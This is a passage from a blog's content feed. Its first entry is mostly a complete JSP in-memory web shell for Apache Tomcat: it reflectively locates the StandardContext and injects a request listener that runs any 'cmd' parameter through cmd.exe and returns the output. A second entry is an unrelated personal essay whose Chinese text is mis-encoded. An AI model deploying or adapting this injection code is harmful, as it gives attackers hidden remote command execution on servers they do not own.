class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardEngine&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardHost&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*&quot;</span> %&gt;<br><br>&lt;%<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat6789</span> &#123;<br>        String uri;<br>        String serverName;<br>        StandardContext standardContext;<br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getField</span><span class="hljs-params">(Object object, String fieldName)</span> &#123;<br>            Field declaredField;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> object.getClass();<br>            <span class="hljs-keyword">while</span> (clazz != Object.class) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br><br>                    declaredField = clazz.getDeclaredField(fieldName);<br>                    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">return</span> declaredField.get(object);<br>                &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e)&#123;&#125;<br>                <span class="hljs-keyword">catch</span> (IllegalAccessException e)&#123;&#125;<br>                clazz = clazz.getSuperclass();<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Tomcat6789</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            Thread[] threads = (Thread[]) <span class="hljs-built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>);<br>            Object object;<br>            <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br><br>                <span class="hljs-keyword">if</span> (thread == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (thread.getName().contains(<span class="hljs-string">&quot;exec&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                <span class="hljs-keyword">if</span> (!(target <span class="hljs-keyword">instanceof</span> Runnable)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    object = getField(getField(getField(target, <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;handler&quot;</span>), <span class="hljs-string">&quot;global&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (object == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                java.util.<span class="hljs-type">ArrayList</span> <span class="hljs-variable">processors</span> <span class="hljs-operator">=</span> (java.util.ArrayList) getField(object, <span class="hljs-string">&quot;processors&quot;</span>);<br>                <span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> processors.iterator();<br>                <span class="hljs-keyword">while</span> (iterator.hasNext()) &#123;<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> iterator.next();<br><br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> getField(next, <span class="hljs-string">&quot;req&quot;</span>);<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">serverPort</span> <span class="hljs-operator">=</span> getField(req, <span class="hljs-string">&quot;serverPort&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (serverPort.equals(-<span class="hljs-number">1</span>))&#123;<span class="hljs-keyword">continue</span>;&#125;<br>                    org.apache.tomcat.util.buf.<span class="hljs-type">MessageBytes</span> <span class="hljs-variable">serverNameMB</span> <span class="hljs-operator">=</span> (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="hljs-string">&quot;serverNameMB&quot;</span>);<br>                    <span class="hljs-built_in">this</span>.serverName = (String) getField(serverNameMB, <span class="hljs-string">&quot;strValue&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.serverName == <span class="hljs-literal">null</span>)&#123;<br>                        <span class="hljs-built_in">this</span>.serverName = serverNameMB.toString();<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.serverName == <span class="hljs-literal">null</span>)&#123;<br>                        <span class="hljs-built_in">this</span>.serverName = serverNameMB.getString();<br>                    &#125;<br><br>                    org.apache.tomcat.util.buf.<span class="hljs-type">MessageBytes</span> <span class="hljs-variable">uriMB</span> <span class="hljs-operator">=</span> (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="hljs-string">&quot;uriMB&quot;</span>);<br>                    <span class="hljs-built_in">this</span>.uri = (String) getField(uriMB, <span class="hljs-string">&quot;strValue&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.uri == <span class="hljs-literal">null</span>)&#123;<br>                        <span class="hljs-built_in">this</span>.uri = uriMB.toString();<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.uri == <span class="hljs-literal">null</span>)&#123;<br>                        <span class="hljs-built_in">this</span>.uri = uriMB.getString();<br>                    &#125;<br><br>                    <span class="hljs-built_in">this</span>.getStandardContext();<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getStandardContext</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            Thread[] threads = (Thread[]) <span class="hljs-built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>);<br>            <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>                <span class="hljs-keyword">if</span> (thread == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> ((thread.getName().contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="hljs-string">&quot;http&quot;</span>))) &#123;<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                    HashMap children;<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">jioEndPoint</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        jioEndPoint = getField(target, <span class="hljs-string">&quot;this$0&quot;</span>);<br>                    &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>                    <span class="hljs-keyword">if</span> (jioEndPoint == <span class="hljs-literal">null</span>)&#123;<br>                        <span class="hljs-keyword">try</span>&#123;<br>                            jioEndPoint = getField(target, <span class="hljs-string">&quot;endpoint&quot;</span>);<br>                        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123; <span class="hljs-keyword">return</span>; &#125;<br>                    &#125;<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> getField(getField(getField(getField(getField(jioEndPoint, <span class="hljs-string">&quot;handler&quot;</span>), <span class="hljs-string">&quot;proto&quot;</span>), <span class="hljs-string">&quot;adapter&quot;</span>), <span class="hljs-string">&quot;connector&quot;</span>), <span class="hljs-string">&quot;service&quot;</span>);<br>                    <span class="hljs-type">StandardEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        engine = (StandardEngine) getField(service, <span class="hljs-string">&quot;container&quot;</span>);<br>                    &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>                    <span class="hljs-keyword">if</span> (engine == <span class="hljs-literal">null</span>)&#123;<br>                        engine = (StandardEngine) getField(service, <span class="hljs-string">&quot;engine&quot;</span>);<br>                    &#125;<br><br>                    children = (HashMap) getField(engine, <span class="hljs-string">&quot;children&quot;</span>);<br>                    <span class="hljs-type">StandardHost</span> <span class="hljs-variable">standardHost</span> <span class="hljs-operator">=</span> (StandardHost) children.get(<span class="hljs-built_in">this</span>.serverName);<br><br>                    children = (HashMap) getField(standardHost, <span class="hljs-string">&quot;children&quot;</span>);<br>                    <span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> children.keySet().iterator();<br>                    <span class="hljs-keyword">while</span> (iterator.hasNext())&#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">contextKey</span> <span class="hljs-operator">=</span> (String) iterator.next();<br>                        <span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">this</span>.uri.startsWith(contextKey)))&#123;<span class="hljs-keyword">continue</span>;&#125;<br>                        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) children.get(contextKey);<br>                        <span class="hljs-built_in">this</span>.standardContext = standardContext;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">public</span> StandardContext <span class="hljs-title function_">getSTC</span><span class="hljs-params">()</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.standardContext;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">Tomcat6789</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Tomcat6789</span>();<br>    out.println(a.getSTC());<br><br>%&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    in = Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;).getInputStream();<br>                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> s.hasNext()?s.next():<span class="hljs-string">&quot;&quot;</span>;<br>                    <span class="hljs-type">Field</span> <span class="hljs-variable">requestF</span> <span class="hljs-operator">=</span> req.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>                    requestF.setAccessible(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (Request)requestF.get(req);<br>                    request.getResponse().getWriter().write(out);<br>                &#125;<br>                <span class="hljs-keyword">catch</span> (IOException e) &#123;&#125;<br>                <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;&#125;<br>                <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;&#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;&#125;<br>    &#125;<br>%&gt;<br><br>&lt;%<br><br><br>    Object[] objects = a.getSTC().getApplicationEventListeners();<br>    List&lt;Object&gt; listeners = Arrays.asList(objects);<br>    List&lt;Object&gt; arrayList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(listeners);<br>    arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyListener</span>());<br>    a.getSTC().setApplicationEventListeners(arrayList.toArray());<br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br><br>%&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å†…å­˜é©¬</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é€ç»™è‡ªå·±</title>
    <link href="/2022/04/16/%E9%80%81%E7%BB%99%E8%87%AA%E5%B7%B1/"/>
    <url>/2022/04/16/%E9%80%81%E7%BB%99%E8%87%AA%E5%B7%B1/</url>
    
    <content type="html"><![CDATA[<h1 id="é€ç»™è‡ªå·±"><a href="#é€ç»™è‡ªå·±" class="headerlink" title="é€ç»™è‡ªå·±"></a>é€ç»™è‡ªå·±</h1><p>â€‹    æœ¬æ¥è¿™ä¸ªåšå®¢æ˜¯æƒ³ç€ä¸“é—¨è®°å½•å­¦ä¹ è®°å½•çš„ã€‚çªç„¶æŠ–éŸ³çœ‹åˆ°äº†åˆæ˜¯ä¸€å¹´çš„å•æ‹›ï¼Œå›æƒ³èµ·è‡ªå·±é‚£å¹´å…¥é—¨ä½“è‚²ï¼Œå·²ç»è¿‡å»äº†5å¹´äº†ï¼Œä½†æ˜¯è¿˜æ˜¯è«åæ„ŸåŠ¨ã€‚æƒ³äº†æƒ³æœ€è¿‘åˆšå¥½ä¸æƒ³å­¦ä¹ ï¼Œå†™ä¸‹è¿™ç¯‡æ–‡ç« é€ç»™è‡ªå·±ã€‚<br>â€‹    æˆ‘è‡ªè®¤ä¸ºè‡ªå·±æ˜¯ä¸€ä¸ªå¼‚å¸¸å¿µæ—§çš„äººï¼Œå°¤å…¶æ˜¯å¯¹æˆ‘äººç”Ÿæ„ä¹‰å¾ˆå¤§çš„äº‹æƒ…ã€‚è®©æˆ‘æƒ³æƒ³ï¼Ÿæˆ‘çš„äººç”Ÿå‡ ä¸ªé‡è¦çš„è½¬æŠ˜ç‚¹?<br>å¯ä»¥è¿™ä¹ˆè¯´æˆ‘å°æ—¶å€™æ˜¯ä¸€ä¸ªå¥½é¢å­ä»¥åŠå–œæ¬¢æ¥å—è¡¨æ‰¬çš„äººï¼Œäºæ˜¯åœ¨æˆ‘å°å­¦ä¹ƒè‡³åˆä¸­ï¼Œæˆ‘éƒ½å°†å­¦ä¹ å­¦çš„å°½é‡å¥½ï¼ˆæœ‰äººå°±åªæ˜¯å¬æ‡‚å­¦æ‡‚è€å¸ˆè®²çš„ï¼‰ã€‚ä¹Ÿå°±æ˜¯è¿™æ ·æˆ‘ä¸€ç›´åœ¨ç­çº§æ’åœ¨å¤„äºæ¯”è¾ƒé å‰çš„ä½ç½®ï¼ˆç°åœ¨å›æƒ³èµ·æ¥ï¼Œä¹Ÿè®¸çœŸæ­£çš„åŸå› æ˜¯æˆ‘å¤„äºä¸€ä¸ªæ¯”è¾ƒå·®çš„ç¯å¢ƒï¼‰ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ï¼Ÿå› ä¸ºåœ¨åˆäºŒå‡åˆä¸‰é‚£å¹´ï¼Œæˆ‘å› ä¸ºæˆç»©çš„åŸå› ï¼Œä»8ç­è½¬åˆ°äº†æ‰€è°“çš„ï¼ˆå¿«ç­ï¼‰1ç­ï¼Œä¹Ÿå°±æ˜¯åœ¨è¿™ä¸€å¹´æ˜¯æˆ‘çš„ç¬¬ä¸€ä¸ªè½¬æŠ˜ç‚¹ã€‚è¿™é‡Œåœ¨ç»†è¯´ä¸€ä¸‹ï¼Œæˆ‘è®¤ä¸ºæˆ‘çš„äººç”Ÿä¸­ç¬¬ä¸€ä¸ªæœ‹å‹ï¼Œâ€<strong>æœ±æ–°å®‡</strong>â€œã€‚å› ä¸ºä»–çš„æˆç»©å·®ï¼ˆä¸ªäººæ„Ÿè§‰æ˜¯ä»–ä¸çˆ±å­¦ä¹ ï¼Œæœ‰æ—¶æˆ‘ä¸ä¼šçš„é—®é¢˜ä»–èƒ½å¤Ÿè§£ç­”ï¼‰ï¼Œæœ‰æ—¶å€™æˆ‘é—®ä»–å¹³å¸¸ä½ æ˜¯è£…ä¸ä¼šå—ï¼Ÿä»–è¯´â€æœ‰æ—¶å€™æ˜¯å§ï¼Ÿä¸»è¦ä¸å–œæ¬¢åˆ«äººå®šä¹‰æˆ‘ã€‚â€é‚£æ—¶å€™æˆ‘è§‰å¾—ä»–é…·é…·çš„ã€‚è¿™é‡Œå°±å‡ºç°äº†æˆ‘äººç”Ÿä¸­çš„ç¬¬ä¸€ä¸ªé—æ†¾ï¼Œåœ¨åˆäºŒåˆšå¼€å§‹çš„æ—¶å€™ï¼Œç”±äºæˆç»©çš„å·®çš„åŸå› ï¼Œè€å¸ˆç»™ä»–å¸¦æ¥äº†å·¨å¤§çš„å‹åŠ›ï¼Œç”šè‡³æ‹¿æˆ‘ä»¬ç­çš„ä¸€ä¸ªæ™ºåŠ›æœ‰é—®é¢˜çš„äººï¼Œå»è·Ÿä»–æ¯”è¾ƒã€‚æœ€åè¿«ä½¿ä»–è‡ªæ„¿é€€å­¦ã€‚ä¸ºä»€ä¹ˆæˆ‘é—æ†¾ï¼Ÿç¬¬ä¸€ç‚¹æ˜¯åœ¨é‚£ä¹‹åæˆ‘å†ä¹Ÿæ²¡æœ‰è·Ÿä»–ä¸€èµ·å‡ºå»ç©è¿‡ã€‚æˆ‘å¤±å»äº†ä¸€ä¸ªå¾ˆå¥½çš„æœ‹å‹ã€‚ç¬¬äºŒç‚¹æˆ‘æ²¡æœ‰åšåˆ°ä¸€ä¸ªæœ‹å‹è¯¥åšçš„å¹¶æ²¡æœ‰åŠé˜»ä»–é€€å­¦çš„äº‹æƒ…ã€‚ï¼ˆç”šè‡³åœ¨æ€‚æ¿ä»–è·Ÿç€è€å¸ˆå¯¹ç€æ¥ï¼‰å¯¹äºæˆ‘æ¥è¯´ï¼Œå®šä¹‰ä¸€ä¸ªäººçœŸçš„ä¸æ˜¯æˆç»©ã€‚å³ä½¿æ˜¯è·Ÿæˆç»©å·®çš„å­¦ç”Ÿåœ¨ä¸€èµ·ç©ï¼Œä¹Ÿå¹¶ä¸ä¼šæ”¹å˜è‡ªå·±ä»€ä¹ˆã€‚ï¼ˆè¿™æ˜¯æˆ‘åœ¨é‚£ä¸ªæ—¶å€™çš„çœ‹æ³•ï¼Œç°åœ¨æˆ‘20å²ä¾æ—§æ˜¯è¿™ä¸ªçœ‹æ³•ï¼Œæˆ‘å°†è¿™ä¸€åˆ‡çš„èƒ½å¤Ÿæ”¹å˜è‡ªå·±çš„ä¸œè¥¿ï¼Œå½’ç»“ä¸æ˜¯è‡ªå·±+å®¶æ•™çš„åŸå› ã€‚è¿™ä¸€ç‚¹ä¹Ÿè®¸æ˜¯å¤ªç»å¯¹äº†ï¼Œä½†æ˜¯æˆ‘ä»å°çœŸçš„ä»è€å¸ˆã€å®¶é•¿å£ä¸­æ‰€è¯´çš„åå­¦ç”Ÿä¸­å­¦åˆ°äº†å¾ˆå¤šã€‚ï¼‰<br>â€‹    å›åˆ°æˆ‘çš„ç¬¬ä¸€ä¸ªè½¬æŠ˜ç‚¹ï¼Œåœ¨è½¬å…¥1ç­ï¼Œæˆ‘ç¢°åˆ°äº†ä¸€ä¸ªç¾å¥³ç­ä¸»ä»»ï¼Œäºæ˜¯æˆ‘å¼€å§‹è®¤çœŸå¬è¯¾ã€‚ç‰©ç†æˆç»©çªé£çŒ›è¿›ï¼ˆåŸºæœ¬éƒ½æ˜¯å¹´çºªå‰å‡ çš„æ°´å¹³å­ï¼‰ï¼Œä½†æ˜¯å…¶ä»–è¯¾çš„æ°´å¹³æ¯”è¾ƒå¹³å¹³æ— å¥‡ã€‚ä½†æ˜¯åœ¨å©†å©†ç”Ÿç€ç—…ç»™æˆ‘åšäº†ä¸€ä»½æ—©é¥­ä¹‹åï¼Œå½“æ—¶æ˜¯ä»€ä¹ˆæƒ…æ™¯å‘¢ï¼Ÿä¹Ÿä¸çŸ¥é“é‚£å¤©æ˜¯ä¸ºä»€ä¹ˆï¼Ÿè«åè‡ªå·±å°±é†’äº†ï¼Œç„¶åæˆ‘æ‰“å¼€æˆ¿é—¨ï¼Œçœ‹åˆ°å©†å©†è¸‰è·„çš„æ‰¶ç€æ¥¼æ¢¯è¯´â€æ´‹æ´‹ï¼Œé¥­åœ¨æ¡Œå­ä¸Šï¼Œå¿«åƒäº†ï¼Ÿâ€œå³ä½¿å£°éŸ³å¾ˆè™šå¼±ï¼Œä½†ä¹Ÿè®¸æ˜¯æ—©ä¸Šå¤©è¿˜é»‘ç€çš„åŸå› ï¼Œæˆ‘å¬å¾—å¾ˆæ¸…æ¥šã€‚é‚£é¡¿é¥­æˆ‘æ²¡æœ‰åƒï¼Œç•™ä¸‹äº†ä¸€å¥ï¼Œä½ åƒå­ï¼Ÿæˆ‘å¾—èµ¶ç€ä¸Šè¯¾äº†ã€‚é‚£å¤©æˆ‘èµ°åœ¨è·¯ä¸Šï¼Œå¯èƒ½æ˜¯æˆ‘åˆä¸­å¾—æ—¶å€™ç¬¬ä¸€æ¬¡æ‰çœ¼æ³ªã€‚ä¸€è·¯åˆ°å­¦æ ¡æˆ‘å°±é—®äº†è‡ªå·±ä¸¤ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆå©†å©†è¦è¿™ä¹ˆåšï¼Ÿæˆ‘è¯¥å¦‚ä½•æ±‡æŠ¥æˆ‘å©†å©†ï¼Ÿé‚£æ—¶å€™å©†å©†å”¯ä¸€å¾—å¿µæƒ³æ˜¯æˆ‘èƒ½è€ƒä¸Šå¤§å­¦ï¼Œä¹Ÿå°±æ˜¯å‰ææˆ‘èƒ½è€ƒä¸Šä¸€ä¸ªé«˜ä¸­ã€‚ç¡®å®ä»é‚£ä¸€å¤©å¼€å§‹ï¼Œæˆ‘å¾—æˆç»©çªé£çŒ›è¿›ï¼Œè·»èº«ç­çº§å‰é¢å‡ åã€‚å¥ˆä½•ä¸­è€ƒï¼Œå› ä¸ºåˆä¸€åˆäºŒå¾—çŸ¥è¯†æ²¡æœ‰å­¦å¥½ï¼Œæœ€ååªèƒ½ä¸Šä¸€ä¸ªå­¦è´¹å¾ˆå¤šå¾—ç ´é«˜ä¸­ã€‚æ‹¿åˆ°å½•å–é€šçŸ¥ä¹¦å¾—æ—¶å€™ï¼Œçœ‹åˆ°åˆ«çš„åŒå­¦æ‹¿åˆ°äº†ä»€ä¹ˆä¸€ä¸­ã€æ¢…æ‘ã€ç«‹äººé«˜ä¸­å¾—å½•å–é€šçŸ¥ä¹¦ï¼Œæˆ‘çŸ¥é“å¯èƒ½æˆ‘å¾—äººç”Ÿç¬¬ä¸€æ¬¡æœè¾“äº†ã€‚è™½ç„¶å®¶é‡Œå¤§å®¶éƒ½å¾ˆå¼€å¿ƒï¼Œè¯´ç€ç»ˆäºç­‰åˆ°äº†é€šçŸ¥ä¹¦äº†ã€‚ä½†æ˜¯æˆ‘å§‹ç»ˆå¼€å¿ƒä¸èµ·æ¥ã€‚åæ¥å¬è¯´æœ‰çš„åŒå­¦è·Ÿæˆ‘å·®ä¸å¤šï¼Œé€‰æ‹©äº†å¤è¯»ã€‚æˆ‘äºæ˜¯è·Ÿæˆ‘å¦ˆå¦ˆè¯´äº†è¿™ä¸ªäº‹æƒ…ã€‚å¦ˆå¦ˆå¼€å§‹æœ¬ä»¥ä¸ºæˆ‘å¼€å¼€ç©ç¬‘å¾—ï¼Ÿå¯èƒ½é‚£æ—¶å€™å¥¹ä¹Ÿä¸ä¼šè§‰å¾—æˆ‘ä¼šæå‡ºå»å¤è¯»å¾—æƒ³æ³•å­ï¼Ÿä¸è¿‡æœ€åæˆ‘è¿˜æ˜¯æ²¡æœ‰å¤è¯»ï¼Œå›åˆ°äº†é«˜ä¸­ã€‚<br>â€‹    å› ä¸ºæ˜¯è€å®¶å¾—é«˜ä¸­ï¼Œå¡äº†ç‚¹é’±è¿›å»ã€‚å¾ˆè½»æ¾å°±è¿›å»äº†ã€‚é‚£æ—¶å€™æˆ‘è§‰å¾—æˆ‘å¤©ä¸æ€•åœ°ä¸æ€•ï¼Œä¸€ä¸ªäººå›å»è¯»ä¹¦ä¹Ÿæ— æ‰€è°“ã€‚ï¼ˆè‡³ä»Šæˆ‘ä¹ŸæŒºè‡ªè±ªæˆ‘ä»å°å°±èƒ½å¤Ÿç‹¬ç«‹ï¼‰ä½†æ˜¯æˆ‘å¾—ç­ä¸»ä»»ï¼Œè®©æˆ‘ç¬¬ä¸€æ¬¡è§‰å¾—ï¼Œäººè‡ªå·±ä¸è¡Œåˆ«æƒ³åˆ«äººçœ‹çš„èµ·ä½ ï¼Œæˆ‘å›å»å¾—é‚£ä¸€å¹´ï¼Œç­ä¸»ä»»è®¤ä¸ºæˆ‘æ˜¯å·®ç”Ÿï¼Œçœ¼ç¥è®©æˆ‘å¾ˆä¸èˆ’æœã€‚ç”šè‡³åœ¨ç¬¬ä¸€æ¬¡æœˆè€ƒå¾—æ—¶å€™ï¼Œæˆ‘æ’åœ¨ç­çº§ç¬¬äºŒå¾—ä½ç½®ï¼Œåœ¨ä»–é€šæŠ¥æˆç»©å¾—æ—¶å€™ï¼Œè¯´äº†ç¬¬ä¸€åï¼Œç¬¬ä¸‰åã€‚å¿½ç•¥äº†æˆ‘ï¼Œé‚£æ—¶å€™æˆ‘æƒ³ä»–è‚¯å®šè§‰å¾—æˆ‘æˆç»©æ˜¯é ä½œå¼Šæ¥çš„ã€‚åæ¥å½“ç„¶ä¹Ÿå¬è¯´ä»–ç«Ÿç„¶å»é—®äº†æ¯è¯¾è€å¸ˆæˆ‘å¾—ä¸Šè¯¾çŠ¶æ€ã€‚åæ¥æ…¢æ…¢ä»–ä¹Ÿå¯¹æˆ‘å¾—æ€åº¦è½¬å˜äº†ã€‚é«˜ä¸€ä¸‹åŠä¸‹å­¦æœŸï¼Œè¿æ¥äº†æˆ‘å¾—äººç”Ÿç¬¬äºŒä¸ªè½¬æŠ˜ç‚¹ã€‚<br>â€‹    æˆ‘é€‰æ‹©äº†å­¦ä½“è‚²ã€‚è¯´å‡ºæ¥å¯èƒ½å¾ˆå¤šäººä¸ä¿¡ï¼Œæˆ‘é€‰æ‹©å­¦ä½“è‚²æ˜¯åœ¨æˆ‘ä½äºç­çº§å‰ä¸‰å¾—æ°´å¹³å»å­¦çš„ã€‚ç­ä¸»ä»»ç¬¬ä¸€ä¸ªç«™å‡ºæ¥è®©æˆ‘ä¸è¦å»å­¦ä½“è‚²ï¼ˆä½†æ˜¯æˆ‘å°±æ˜¯è¦çŠŸï¼ï¼‰ï¼Œæœ€åæˆ‘è¿˜æ˜¯å»äº†ã€‚ä½†æ˜¯å…¶å®é‚£æ—¶å€™çœŸæ­£çš„åŸå› å¹¶ä¸æ˜¯è¿™äº›ã€‚å› ä¸ºæˆ‘åœ¨ç½‘ä¸Šå†²æµªçš„æ—¶å€™å¬è¯´å­¦ä½“è‚²æ–‡åŒ–åˆ†ä¸ç”¨å¤ªé«˜å°±å¯ä»¥ä¸Šä¸€ä¸ªå¤§å­¦ã€‚è€Œé‚£æ—¶å€™çš„æƒ³æ³•å°±æ˜¯ä¸€å®šè¦è€ƒä¸€ä¸ªå¤§å­¦ï¼Œè®©å©†å©†å¼€å¿ƒã€‚å°±è¿™ä¹ˆç®€å•ã€‚æœ€åæˆ‘ä¹Ÿå¦‚æ„¿ä»¥å¿çš„è€ƒä¸Šäº†å¤§å­¦ã€‚ä½†æ˜¯åœ¨è¿™é€”ä¸­ä»ç„¶æœ‰å‡ 